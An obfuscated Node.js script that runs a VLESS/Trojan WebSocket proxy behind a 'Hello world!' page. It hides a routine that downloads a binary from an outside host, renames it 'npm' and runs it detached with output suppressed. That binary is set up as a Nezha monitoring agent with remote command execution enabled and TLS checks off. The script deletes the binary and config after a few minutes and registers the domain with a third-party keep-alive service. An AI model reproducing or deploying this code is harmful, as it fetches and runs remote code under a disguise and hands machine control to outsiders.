const _0x1de3fb=_0x2bd5;(function(_0x36a0cc,_0x5c852d){const _0x21a0ef=_0x2bd5,_0x118bec=_0x36a0cc();while(!![]){try{const _0x3ddc63=-parseInt(_0x21a0ef(0x1e2))/0x1+-parseInt(_0x21a0ef(0x215))/0x2*(-parseInt(_0x21a0ef(0x1f8))/0x3)+parseInt(_0x21a0ef(0x1c9))/0x4+parseInt(_0x21a0ef(0x239))/0x5+parseInt(_0x21a0ef(0x20d))/0x6*(-parseInt(_0x21a0ef(0x208))/0x7)+-parseInt(_0x21a0ef(0x1e3))/0x8*(-parseInt(_0x21a0ef(0x226))/0x9)+-parseInt(_0x21a0ef(0x228))/0xa*(parseInt(_0x21a0ef(0x237))/0xb);if(_0x3ddc63===_0x5c852d)break;else _0x118bec['push'](_0x118bec['shift']());}catch(_0x1f7210){_0x118bec['push'](_0x118bec['shift']());}}}(_0x4eb2,0x9d403));const os=require('os'),http=require(_0x1de3fb(0x1ed)),fs=require('fs'),axios=require(_0x1de3fb(0x1d5)),net=require(_0x1de3fb(0x205)),path=require(_0x1de3fb(0x1db)),crypto=require(_0x1de3fb(0x1f6)),{Buffer}=require(_0x1de3fb(0x1e6)),{exec,execSync}=require(_0x1de3fb(0x231)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1de3fb(0x1dc)][_0x1de3fb(0x204)]||_0x1de3fb(0x1bb),NEZHA_SERVER=process[_0x1de3fb(0x1dc)][_0x1de3fb(0x1c1)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1de3fb(0x1dc)][_0x1de3fb(0x1cc)]||'',DOMAIN=process[_0x1de3fb(0x1dc)][_0x1de3fb(0x22e)]||_0x1de3fb(0x221),AUTO_ACCESS=process[_0x1de3fb(0x1dc)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x1de3fb(0x1b7)]||UUID[_0x1de3fb(0x20e)](0x0,0x8),SUB_PATH=process[_0x1de3fb(0x1dc)][_0x1de3fb(0x1c2)]||_0x1de3fb(0x20f),NAME=process[_0x1de3fb(0x1dc)][_0x1de3fb(0x210)]||_0x1de3fb(0x206),PORT=process['env'][_0x1de3fb(0x218)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1d8759=_0x1de3fb;try{const _0x5bd7e4=await axios[_0x1d8759(0x1da)](_0x1d8759(0x233)),_0x160cb5=_0x5bd7e4[_0x1d8759(0x232)];ISP=(_0x160cb5[_0x1d8759(0x1fc)]+'-'+_0x160cb5[_0x1d8759(0x220)])[_0x1d8759(0x20a)](/ /g,'_');}catch(_0x28ea46){ISP=_0x1d8759(0x214);}};GetISP();const httpServer=http[_0x1de3fb(0x207)]((_0x5838c7,_0x432ca2)=>{const _0x469a0e=_0x1de3fb;if(_0x5838c7[_0x469a0e(0x1e8)]==='/'){const _0x3447b9=path[_0x469a0e(0x200)](__dirname,'index.html');fs['readFile'](_0x3447b9,_0x469a0e(0x1d9),(_0x41c6d5,_0x30b4a8)=>{const _0x300e9a=_0x469a0e;if(_0x41c6d5){_0x432ca2[_0x300e9a(0x1e1)](0xc8,{'Content-Type':_0x300e9a(0x1e9)}),_0x432ca2[_0x300e9a(0x1be)](_0x300e9a(0x1fb));return;}_0x432ca2[_0x300e9a(0x1e1)](0xc8,{'Content-Type':_0x300e9a(0x1e9)}),_0x432ca2[_0x300e9a(0x1be)](_0x30b4a8);});return;}else{if(_0x5838c7['url']==='/'+SUB_PATH){const _0x31d570=_0x469a0e(0x23a)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x469a0e(0x217)+DOMAIN+_0x469a0e(0x22c)+WSPATH+'#'+NAME+'-'+ISP,_0x2a6a69=_0x469a0e(0x1d6)+UUID+'@'+DOMAIN+_0x469a0e(0x23b)+DOMAIN+_0x469a0e(0x217)+DOMAIN+_0x469a0e(0x22c)+WSPATH+'#'+NAME+'-'+ISP,_0xc0d0e7=_0x31d570+'\x0a'+_0x2a6a69,_0x2fbf75=Buffer[_0x469a0e(0x222)](_0xc0d0e7)[_0x469a0e(0x211)](_0x469a0e(0x1f5));_0x432ca2[_0x469a0e(0x1e1)](0xc8,{'Content-Type':'text/plain'}),_0x432ca2[_0x469a0e(0x1be)](_0x2fbf75+'\x0a');}else _0x432ca2[_0x469a0e(0x1e1)](0x194,{'Content-Type':_0x469a0e(0x1ea)}),_0x432ca2[_0x469a0e(0x1be)](_0x469a0e(0x22d));}}),wss=new WebSocket[(_0x1de3fb(0x1bf))]({'server':httpServer}),uuid=UUID[_0x1de3fb(0x20a)](/-/g,''),DNS_SERVERS=[_0x1de3fb(0x20c),_0x1de3fb(0x1f1)];function resolveHost(_0x3b3950){return new Promise((_0x4ce11c,_0x3c5f0d)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3b3950)){_0x4ce11c(_0x3b3950);return;}let _0x100abb=0x0;function _0xdc5aaf(){const _0x5ef64b=_0x2bd5;if(_0x100abb>=DNS_SERVERS[_0x5ef64b(0x1c5)]){_0x3c5f0d(new Error(_0x5ef64b(0x223)+_0x3b3950+_0x5ef64b(0x236)));return;}const _0x30592e=DNS_SERVERS[_0x100abb];_0x100abb++;const _0x29e311=_0x5ef64b(0x1d0)+encodeURIComponent(_0x3b3950)+_0x5ef64b(0x234);axios[_0x5ef64b(0x1da)](_0x29e311,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x5ef64b(0x1eb)](_0x787e6c=>{const _0x1d1f61=_0x5ef64b,_0x2d2e39=_0x787e6c[_0x1d1f61(0x232)];if(_0x2d2e39['Status']===0x0&&_0x2d2e39[_0x1d1f61(0x1f7)]&&_0x2d2e39['Answer'][_0x1d1f61(0x1c5)]>0x0){const _0x5c2379=_0x2d2e39[_0x1d1f61(0x1f7)][_0x1d1f61(0x20b)](_0x22806f=>_0x22806f[_0x1d1f61(0x1d1)]===0x1);if(_0x5c2379){_0x4ce11c(_0x5c2379[_0x1d1f61(0x232)]);return;}}_0xdc5aaf();})[_0x5ef64b(0x209)](_0x1db929=>{_0xdc5aaf();});}_0xdc5aaf();});}function handleVlessConnection(_0x2c2a42,_0x278bbb){const _0x3dfd12=_0x1de3fb,[_0x155f47]=_0x278bbb,_0x21f04c=_0x278bbb['slice'](0x1,0x11);if(!_0x21f04c[_0x3dfd12(0x1c8)]((_0x3e310e,_0x1a6e15)=>_0x3e310e==parseInt(uuid['substr'](_0x1a6e15*0x2,0x2),0x10)))return![];let _0x18005a=_0x278bbb[_0x3dfd12(0x20e)](0x11,0x12)[_0x3dfd12(0x201)]()+0x13;const _0x2a7104=_0x278bbb[_0x3dfd12(0x20e)](_0x18005a,_0x18005a+=0x2)[_0x3dfd12(0x22a)](0x0),_0x46a841=_0x278bbb[_0x3dfd12(0x20e)](_0x18005a,_0x18005a+=0x1)[_0x3dfd12(0x201)](),_0x396018=_0x46a841==0x1?_0x278bbb['slice'](_0x18005a,_0x18005a+=0x4)[_0x3dfd12(0x200)]('.'):_0x46a841==0x2?new TextDecoder()[_0x3dfd12(0x1ef)](_0x278bbb['slice'](_0x18005a+0x1,_0x18005a+=0x1+_0x278bbb['slice'](_0x18005a,_0x18005a+0x1)[_0x3dfd12(0x201)]())):_0x46a841==0x3?_0x278bbb[_0x3dfd12(0x20e)](_0x18005a,_0x18005a+=0x10)['reduce']((_0x4fed35,_0x4371c0,_0xd23a51,_0x3f218f)=>_0xd23a51%0x2?_0x4fed35[_0x3dfd12(0x213)](_0x3f218f['slice'](_0xd23a51-0x1,_0xd23a51+0x1)):_0x4fed35,[])['map'](_0x4f93a0=>_0x4f93a0['readUInt16BE'](0x0)[_0x3dfd12(0x211)](0x10))[_0x3dfd12(0x200)](':'):'';_0x2c2a42[_0x3dfd12(0x1bc)](new Uint8Array([_0x155f47,0x0]));const _0x54d5b1=createWebSocketStream(_0x2c2a42);return resolveHost(_0x396018)[_0x3dfd12(0x1eb)](_0x68593a=>{const _0x38fa0e=_0x3dfd12;net[_0x38fa0e(0x1ba)]({'host':_0x68593a,'port':_0x2a7104},function(){const _0x33d17b=_0x38fa0e;this[_0x33d17b(0x1e0)](_0x278bbb[_0x33d17b(0x20e)](_0x18005a)),_0x54d5b1['on']('error',()=>{})['pipe'](this)['on'](_0x33d17b(0x1f9),()=>{})[_0x33d17b(0x1e5)](_0x54d5b1);})['on'](_0x38fa0e(0x1f9),()=>{});})[_0x3dfd12(0x209)](_0x92511d=>{const _0x11c424=_0x3dfd12;net[_0x11c424(0x1ba)]({'host':_0x396018,'port':_0x2a7104},function(){const _0x28d716=_0x11c424;this[_0x28d716(0x1e0)](_0x278bbb[_0x28d716(0x20e)](_0x18005a)),_0x54d5b1['on'](_0x28d716(0x1f9),()=>{})[_0x28d716(0x1e5)](this)['on'](_0x28d716(0x1f9),()=>{})[_0x28d716(0x1e5)](_0x54d5b1);})['on'](_0x11c424(0x1f9),()=>{});}),!![];}function handleTrojanConnection(_0x2a880e,_0x660389){const _0x430917=_0x1de3fb;try{if(_0x660389['length']<0x3a)return![];const _0x4082d0=_0x660389['slice'](0x0,0x38)['toString'](),_0xd4cc97=[UUID];let _0xaf1db9=null;for(const _0x4306f2 of _0xd4cc97){const _0x57ce2c=crypto[_0x430917(0x216)](_0x430917(0x224))['update'](_0x4306f2)[_0x430917(0x1cd)](_0x430917(0x21f));if(_0x57ce2c===_0x4082d0){_0xaf1db9=_0x4306f2;break;}}if(!_0xaf1db9)return![];let _0xc3b35b=0x38;_0x660389[_0xc3b35b]===0xd&&_0x660389[_0xc3b35b+0x1]===0xa&&(_0xc3b35b+=0x2);const _0x2e38b8=_0x660389[_0xc3b35b];if(_0x2e38b8!==0x1)return![];_0xc3b35b+=0x1;const _0x18b63d=_0x660389[_0xc3b35b];_0xc3b35b+=0x1;let _0x13f4f6,_0x5462e1;if(_0x18b63d===0x1)_0x13f4f6=_0x660389[_0x430917(0x20e)](_0xc3b35b,_0xc3b35b+0x4)[_0x430917(0x200)]('.'),_0xc3b35b+=0x4;else{if(_0x18b63d===0x3){const _0x1996a6=_0x660389[_0xc3b35b];_0xc3b35b+=0x1,_0x13f4f6=_0x660389[_0x430917(0x20e)](_0xc3b35b,_0xc3b35b+_0x1996a6)[_0x430917(0x211)](),_0xc3b35b+=_0x1996a6;}else{if(_0x18b63d===0x4)_0x13f4f6=_0x660389['slice'](_0xc3b35b,_0xc3b35b+0x10)[_0x430917(0x22b)]((_0x6dffdd,_0x36ee29,_0x3f85ec,_0x73f95e)=>_0x3f85ec%0x2?_0x6dffdd[_0x430917(0x213)](_0x73f95e[_0x430917(0x20e)](_0x3f85ec-0x1,_0x3f85ec+0x1)):_0x6dffdd,[])['map'](_0x294443=>_0x294443['readUInt16BE'](0x0)[_0x430917(0x211)](0x10))['join'](':'),_0xc3b35b+=0x10;else return![];}}_0x5462e1=_0x660389[_0x430917(0x22a)](_0xc3b35b),_0xc3b35b+=0x2;_0xc3b35b<_0x660389[_0x430917(0x1c5)]&&_0x660389[_0xc3b35b]===0xd&&_0x660389[_0xc3b35b+0x1]===0xa&&(_0xc3b35b+=0x2);const _0x58af73=createWebSocketStream(_0x2a880e);return resolveHost(_0x13f4f6)[_0x430917(0x1eb)](_0x1920e8=>{const _0x5b753d=_0x430917;net[_0x5b753d(0x1ba)]({'host':_0x1920e8,'port':_0x5462e1},function(){const _0x5ab846=_0x5b753d;_0xc3b35b<_0x660389['length']&&this['write'](_0x660389[_0x5ab846(0x20e)](_0xc3b35b)),_0x58af73['on'](_0x5ab846(0x1f9),()=>{})[_0x5ab846(0x1e5)](this)['on'](_0x5ab846(0x1f9),()=>{})['pipe'](_0x58af73);})['on']('error',()=>{});})['catch'](_0x4f749b=>{const _0x48a054=_0x430917;net[_0x48a054(0x1ba)]({'host':_0x13f4f6,'port':_0x5462e1},function(){const _0x178d41=_0x48a054;_0xc3b35b<_0x660389[_0x178d41(0x1c5)]&&this[_0x178d41(0x1e0)](_0x660389[_0x178d41(0x20e)](_0xc3b35b)),_0x58af73['on'](_0x178d41(0x1f9),()=>{})['pipe'](this)['on'](_0x178d41(0x1f9),()=>{})[_0x178d41(0x1e5)](_0x58af73);})['on'](_0x48a054(0x1f9),()=>{});}),!![];}catch(_0x3287df){return![];}}wss['on'](_0x1de3fb(0x1d4),(_0x397814,_0x4719a2)=>{const _0x57b6de=_0x1de3fb,_0x2d4952=_0x4719a2[_0x57b6de(0x1e8)]||'';_0x397814[_0x57b6de(0x1f3)](_0x57b6de(0x21c),_0x507441=>{const _0x39df9e=_0x57b6de;if(_0x507441[_0x39df9e(0x1c5)]>0x11&&_0x507441[0x0]===0x0){const _0x30529b=_0x507441['slice'](0x1,0x11),_0x37e52f=_0x30529b[_0x39df9e(0x1c8)]((_0x3d6339,_0x423c97)=>_0x3d6339==parseInt(uuid['substr'](_0x423c97*0x2,0x2),0x10));if(_0x37e52f){!handleVlessConnection(_0x397814,_0x507441)&&_0x397814[_0x39df9e(0x1df)]();return;}}!handleTrojanConnection(_0x397814,_0x507441)&&_0x397814[_0x39df9e(0x1df)]();})['on'](_0x57b6de(0x1f9),()=>{});});const getDownloadUrl=()=>{const _0x3a93a5=_0x1de3fb,_0x158708=os[_0x3a93a5(0x1dd)]();return _0x158708===_0x3a93a5(0x229)||_0x158708===_0x3a93a5(0x1c7)||_0x158708===_0x3a93a5(0x1d3)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x3a93a5(0x22f):!NEZHA_PORT?_0x3a93a5(0x1ec):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5c1c73=_0x1de3fb;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5c4e42=getDownloadUrl(),_0x21111d=await axios({'method':_0x5c1c73(0x1da),'url':_0x5c4e42,'responseType':_0x5c1c73(0x1ff)}),_0x5f3ed3=fs[_0x5c1c73(0x202)](_0x5c1c73(0x21e));return _0x21111d['data'][_0x5c1c73(0x1e5)](_0x5f3ed3),new Promise((_0x39f8d7,_0x1ee5d0)=>{const _0x49ee98=_0x5c1c73;_0x5f3ed3['on']('finish',()=>{const _0x3da3d1=_0x2bd5;console[_0x3da3d1(0x238)](_0x3da3d1(0x227)),exec(_0x3da3d1(0x1bd),_0x41d1a7=>{if(_0x41d1a7)_0x1ee5d0(_0x41d1a7);_0x39f8d7();});}),_0x5f3ed3['on'](_0x49ee98(0x1f9),_0x1ee5d0);});}catch(_0xedd1e0){throw _0xedd1e0;}},runnz=async()=>{const _0x3c2b08=_0x1de3fb;try{const _0x58bea7=execSync(_0x3c2b08(0x21a),{'encoding':'utf-8'});if(_0x58bea7[_0x3c2b08(0x235)]()!==''){console[_0x3c2b08(0x238)](_0x3c2b08(0x1d2));return;}}catch(_0x531edd){}await downloadFile();let _0x5a1296='',_0x2d855b=[_0x3c2b08(0x1f0),_0x3c2b08(0x1c4),_0x3c2b08(0x1ca),'2087',_0x3c2b08(0x21b),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2a20a8=_0x2d855b['includes'](NEZHA_PORT)?_0x3c2b08(0x1c6):'';_0x5a1296=_0x3c2b08(0x1de)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3c2b08(0x225)+NEZHA_KEY+'\x20'+_0x2a20a8+_0x3c2b08(0x212);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x13079c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3c2b08(0x203)](':')[_0x3c2b08(0x1e7)]():'',_0x23360e=_0x2d855b[_0x3c2b08(0x230)](_0x13079c)?'true':_0x3c2b08(0x1b8),_0x35be27=_0x3c2b08(0x219)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x23360e+_0x3c2b08(0x1f4)+UUID;fs[_0x3c2b08(0x21d)](_0x3c2b08(0x23c),_0x35be27);}_0x5a1296=_0x3c2b08(0x1d7);}else{console[_0x3c2b08(0x238)](_0x3c2b08(0x1fe));return;}}try{exec(_0x5a1296,{'shell':_0x3c2b08(0x1ce)},_0x349e34=>{const _0x4fe291=_0x3c2b08;if(_0x349e34)console[_0x4fe291(0x1f9)](_0x4fe291(0x1fa),_0x349e34);else console[_0x4fe291(0x238)](_0x4fe291(0x1ee));});}catch(_0x4593ab){console[_0x3c2b08(0x1f9)](_0x3c2b08(0x1cf)+_0x4593ab);}};async function addAccessTask(){const _0x11e729=_0x1de3fb;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x47f80c=_0x11e729(0x1e4)+DOMAIN;try{const _0x44b8d2=await axios[_0x11e729(0x1c0)](_0x11e729(0x1c3),{'url':_0x47f80c},{'headers':{'Content-Type':_0x11e729(0x1fd)}});console[_0x11e729(0x238)](_0x11e729(0x1d8));}catch(_0x19ab2f){}}const delFiles=()=>{const _0x164a6c=_0x1de3fb;fs[_0x164a6c(0x1cb)](_0x164a6c(0x21e),()=>{}),fs['unlink'](_0x164a6c(0x23c),()=>{});};function _0x2bd5(_0x59e584,_0x2fb3b9){_0x59e584=_0x59e584-0x1b7;const _0x4eb255=_0x4eb2();let _0x2bd5b1=_0x4eb255[_0x59e584];return _0x2bd5b1;}httpServer[_0x1de3fb(0x1f2)](PORT,()=>{const _0x15d740=_0x1de3fb;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x15d740(0x238)](_0x15d740(0x1b9)+PORT);});function _0x4eb2(){const _0x296063=['application/json','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','stream','join','readUInt8','createWriteStream','split','UUID','net','Hug','createServer','6223PFYOYY','catch','replace','find','8.8.4.4','336RgJsoQ','slice','sub','NAME','toString','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','concat','Unknown','8TgseyC','createHash','&fp=chrome&type=ws&host=','PORT','client_secret:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2083','message','writeFileSync','npm','hex','asOrganization','1234.abc.com','from','Failed\x20to\x20resolve\x20','sha224','\x20-p\x20','630657ngBziu','npm\x20download\x20successfully','4750490xpFWEw','arm','readUInt16BE','reduce','&path=%2F','Not\x20Found\x0a','DOMAIN','https://arm64.ssss.nyc.mn/agent','includes','child_process','data','https://speed.cloudflare.com/meta','&type=A','trim','\x20with\x20all\x20DNS\x20servers','11Ecjxls','log','1810325IcJdSp','vless://',':443?security=tls&sni=','config.yaml','WSPATH','false','Server\x20is\x20running\x20on\x20port\x20','connect','02dff093-3b59-40b8-b68e-905a5648b768','send','chmod\x20+x\x20npm','end','Server','post','NEZHA_SERVER','SUB_PATH','https://oooo.serv00.net/add-url','8443','length','--tls','arm64','every','3165536gSPVRz','2096','unlink','NEZHA_KEY','digest','/bin/bash','error:\x20','https://dns.google/resolve?name=','type','npm\x20is\x20already\x20running,\x20skip\x20running...','aarch64','connection','axios','trojan://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Automatic\x20Access\x20Task\x20added\x20successfully','utf8','get','path','env','arch','setsid\x20nohup\x20./npm\x20-s\x20','close','write','writeHead','553978OCEEiW','8HUXsPl','https://','pipe','buffer','pop','url','text/html','text/plain','then','https://amd64.ssss.nyc.mn/v1','http','npm\x20is\x20running','decode','443','1.1.1.1','listen','once','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','base64','crypto','Answer','374541lNIitX','error','npm\x20running\x20error:','Hello\x20world!','country'];_0x4eb2=function(){return _0x296063;};return _0x4eb2();}
